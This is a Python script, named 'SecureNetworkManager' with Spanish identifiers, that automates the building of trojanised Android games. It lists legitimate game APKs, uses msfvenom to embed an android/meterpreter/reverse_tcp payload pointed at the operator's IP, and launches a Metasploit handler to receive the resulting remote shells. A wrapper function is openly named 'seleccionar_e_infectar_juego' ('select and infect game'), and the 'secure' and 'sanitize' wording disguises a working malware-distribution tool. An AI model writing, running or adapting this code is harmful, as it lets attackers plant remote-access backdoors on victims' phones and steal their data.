import os
import subprocess
import requests
import logging
import ipaddress
import tempfile
import shutil
from pathlib import Path
from typing import Optional, List, Tuple


class SecureNetworkManager:
    
    def __init__(self):
        self.setup_logging()
        self.allowed_payloads = {
            'android/meterpreter/reverse_tcp',
            'android/meterpreter/reverse_https'
        }
        self.dependencies = ['apktool', 'msfvenom', 'msfconsole']
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('network_operations.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def validate_ip(self, ip_address: str) -> bool:
        try:
            ipaddress.ip_address(ip_address)
            return True
        except ValueError:
            return False
    
    def validate_port(self, port: str) -> bool:
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except ValueError:
            return False
    
    def sanitize_input(self, user_input: str) -> str:
        dangerous_chars = ['&', '|', ';', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>', '"', "'"]
        sanitized = str(user_input)
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        return sanitized.strip()
    
    def obtener_ip_local_segura(self) -> str:
        try:
            result = subprocess.run(
                ["hostname", "-I"],
                capture_output=True,
                text=True,
                timeout=10,
                check=True
            )
            
            ip_output = result.stdout.strip()
            if ip_output:
                ip_list = ip_output.split()
                for ip in ip_list:
                    if self.validate_ip(ip) and not ip.startswith('127.'):
                        return ip
            
            return "127.0.0.1"
            
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, Exception) as e:
            self.logger.warning(f"Error obteniendo IP local: {e}")
            return "127.0.0.1"
    
    def obtener_ip_publica_segura(self) -> Optional[str]:
        try:
            response = requests.get(
                "https://api.ipify.org",
                timeout=10,
                headers={'User-Agent': 'SecurityTool/1.0'}
            )
            response.raise_for_status()
            
            ip = response.text.strip()
            if self.validate_ip(ip):
                return ip
            else:
                self.logger.warning(f"IP pública obtenida no válida: {ip}")
                return None
                
        except requests.exceptions.RequestException as e:
            self.logger.warning(f"Error obteniendo IP pública: {e}")
            return None
        except Exception as e:
            self.logger.error(f"Error inesperado obteniendo IP pública: {e}")
            return None
    
    def verificar_dependencia_segura(self, nombre: str) -> bool:
        try:
            if nombre not in self.dependencies:
                self.logger.error(f"Dependencia no permitida: {nombre}")
                return False
            
            result = subprocess.run(
                ["which", nombre],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                print(f"[OK] {nombre} está instalado")
                self.logger.info(f"Dependencia {nombre} verificada")
                return True
            else:
                print(f"[ERROR] {nombre} no está instalado")
                respuesta = input(f"¿Instalar {nombre}? (s/N): ").strip().lower()
                
                if respuesta == 's':
                    return self.instalar_dependencia_segura(nombre)
                else:
                    return False
                    
        except subprocess.TimeoutExpired:
            self.logger.error(f"Timeout verificando dependencia: {nombre}")
            return False
        except Exception as e:
            self.logger.error(f"Error verificando dependencia {nombre}: {e}")
            return False
    
    def instalar_dependencia_segura(self, nombre: str) -> bool:
        try:
            print(f"Instalando {nombre}...")
            
            result = subprocess.run(
                ["sudo", "apt", "install", "-y", nombre],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            if result.returncode == 0:
                print(f"[OK] {nombre} instalado correctamente")
                self.logger.info(f"Dependencia {nombre} instalada")
                return True
            else:
                print(f"[ERROR] Error instalando {nombre}")
                self.logger.error(f"Error instalando {nombre}: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"Timeout instalando dependencia: {nombre}")
            return False
        except Exception as e:
            self.logger.error(f"Error instalando dependencia {nombre}: {e}")
            return False
    
    def lanzar_handler_seguro(self, lhost: str, lport: str) -> bool:
        try:
            if not self.validate_ip(lhost):
                self.logger.error(f"IP no válida para handler: {lhost}")
                return False
            
            if not self.validate_port(lport):
                self.logger.error(f"Puerto no válido para handler: {lport}")
                return False
            
            print("\nLanzando handler de Metasploit...")
            
            sanitized_lhost = self.sanitize_input(lhost)
            sanitized_lport = self.sanitize_input(lport)
            
            comandos = [
                "use exploit/multi/handler",
                "set payload android/meterpreter/reverse_tcp",
                f"set LHOST {sanitized_lhost}",
                f"set LPORT {sanitized_lport}",
                "set ExitOnSession false",
                "exploit -j"
            ]
            
            command_string = "; ".join(comandos)
            
            result = subprocess.run(
                ["msfconsole", "-q", "-x", command_string],
                timeout=None,
                check=False
            )
            
            self.logger.info(f"Handler ejecutado con código: {result.returncode}")
            return result.returncode == 0
            
        except Exception as e:
            self.logger.error(f"Error lanzando handler: {e}")
            return False
    
    def listar_apk_seguros(self, directorio: str) -> List[str]:
        try:
            juegos_path = Path(directorio)
            
            if not juegos_path.exists():
                self.logger.warning(f"Directorio no existe: {directorio}")
                return []
            
            apk_files = []
            for file_path in juegos_path.iterdir():
                if file_path.is_file() and file_path.suffix.lower() == '.apk':
                    if file_path.stat().st_size > 0:
                        apk_files.append(file_path.name)
            
            return sorted(apk_files)
            
        except Exception as e:
            self.logger.error(f"Error listando APKs: {e}")
            return []
    
    def generar_apk_modificado(self, apk_original: str, ip: str, puerto: str, output_path: str) -> bool:
        try:
            if not os.path.exists(apk_original):
                self.logger.error(f"APK original no encontrado: {apk_original}")
                return False
            
            if not self.validate_ip(ip):
                self.logger.error(f"IP no válida: {ip}")
                return False
            
            if not self.validate_port(puerto):
                self.logger.error(f"Puerto no válido: {puerto}")
                return False
            
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            
            sanitized_ip = self.sanitize_input(ip)
            sanitized_port = self.sanitize_input(puerto)
            
            comando = [
                "msfvenom",
                "-x", apk_original,
                "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={sanitized_ip}",
                f"LPORT={sanitized_port}",
                "-o", output_path
            ]
            
            print("Generando APK modificado...")
            
            result = subprocess.run(
                comando,
                capture_output=True,
                text=True,
                timeout=600,
                check=True
            )
            
            if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
                print(f"APK modificado generado: {output_path}")
                self.logger.info(f"APK modificado generado exitosamente: {output_path}")
                return True
            else:
                self.logger.error("APK modificado no se generó correctamente")
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.error("Timeout generando APK modificado")
            return False
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error ejecutando msfvenom: {e}")
            print(f"Error generando APK: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Error inesperado generando APK: {e}")
            return False
    
    def seleccionar_e_procesar_apk(self) -> bool:
        try:
            for dep in ['apktool', 'msfvenom']:
                if not self.verificar_dependencia_segura(dep):
                    print(f"Dependencia requerida no disponible: {dep}")
                    return False
            
            juegos_dir = "juegos_legitimos"
            juegos = self.listar_apk_seguros(juegos_dir)
            
            if not juegos:
                print("No se encontraron archivos APK en 'juegos_legitimos'")
                return False
            
            print("\nArchivos APK disponibles:")
            for i, juego in enumerate(juegos, start=1):
                print(f" {i}. {juego}")
            
            try:
                opcion = input("\nSelecciona un archivo: ").strip()
                if not opcion.isdigit():
                    print("Entrada inválida")
                    return False
                
                opcion_num = int(opcion)
                if opcion_num < 1 or opcion_num > len(juegos):
                    print("Opción fuera de rango")
                    return False
                    
            except ValueError:
                print("Entrada inválida")
                return False
            
            apk_original = os.path.join(juegos_dir, juegos[opcion_num - 1])
            
            ip_local = self.obtener_ip_local_segura()
            ip_publica = self.obtener_ip_publica_segura()
            
            print("\nIPs detectadas:")
            if ip_publica:
                print(f" 1. IP pública: {ip_publica}")
            print(f" 2. IP local: {ip_local}")
            
            opcion_ip = input("¿Qué IP usar? (1=Pública, 2=Local): ").strip()
            
            if opcion_ip == "1" and ip_publica:
                ip_seleccionada = ip_publica
            else:
                ip_seleccionada = ip_local
            
            puerto = input("Puerto (ej. 8080): ").strip()
            if not self.validate_port(puerto):
                print("Puerto inválido")
                return False
            
            nombre_base = os.path.splitext(juegos[opcion_num - 1])[0]
            apk_modificado = os.path.join("output", f"{nombre_base}_modified.apk")
            
            print(f"\nProcesando con IP: {ip_seleccionada} Puerto: {puerto}")
            
            if self.generar_apk_modificado(apk_original, ip_seleccionada, puerto, apk_modificado):
                return self.lanzar_handler_seguro(ip_seleccionada, puerto)
            else:
                return False
                
        except KeyboardInterrupt:
            print("\nOperación cancelada por el usuario")
            return False
        except Exception as e:
            self.logger.error(f"Error en selección y procesamiento: {e}")
            return False


network_manager = SecureNetworkManager()


def obtener_ip_local():
    return network_manager.obtener_ip_local_segura()


def obtener_ip_publica():
    return network_manager.obtener_ip_publica_segura()


def verificar_dependencia(nombre):
    return network_manager.verificar_dependencia_segura(nombre)


def lanzar_handler(lhost, lport):
    return network_manager.lanzar_handler_seguro(lhost, lport)


def seleccionar_e_infectar_juego():
    return network_manager.seleccionar_e_procesar_apk()